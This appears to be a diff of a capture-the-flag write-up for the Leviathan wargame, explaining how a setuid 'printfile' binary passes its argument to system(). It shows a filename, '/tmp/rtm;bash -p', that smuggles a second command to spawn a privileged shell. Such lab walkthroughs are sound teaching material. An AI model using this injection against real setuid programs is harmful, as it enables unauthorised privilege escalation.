@@ -88,7 +88,7 @@ Write up:
 
      ./printfile accepts a filename argument.
       /bin/cat is used to output the requested file.
-      access() checks if user leviathan2 has sufficient permissions.
+      access() checks if user leviathan2 has sufficient permissions.(mode =4)
       A string is prepared using snprintf(), concatenating /bin/cat with the supplied argument.
       setreuid() sets the real and effective UID of leviathan3.
       system() call supplied with the above string.
@@ -108,7 +108,7 @@ Write up:
   In this case, user leviathan2 does not have the necessary permissions to access a file owned by leviathan3.
   
   
-  touch /tmp/rtm;bash -p
+4.  touch /tmp/rtm;bash -p #   use a - “;” to add a second command that spawn a shell.
   ./printfile '/tmp/rtm;bash -p'
   whoami 
        output:leviathan3
